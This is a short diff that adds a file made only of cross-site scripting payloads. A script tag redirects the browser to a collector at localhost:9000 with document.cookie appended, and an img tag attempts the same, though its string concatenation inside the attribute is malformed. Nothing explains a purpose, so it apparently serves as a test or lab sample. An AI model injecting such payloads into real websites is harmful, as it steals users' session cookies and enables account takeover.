@@ -1,0 +1,3 @@
+<script>window.location="http://localhost:9000?cookie="+document.cookie</script>
+
+<img src="http://localhost:9000?cookie="+document.cookie alt="Hello">
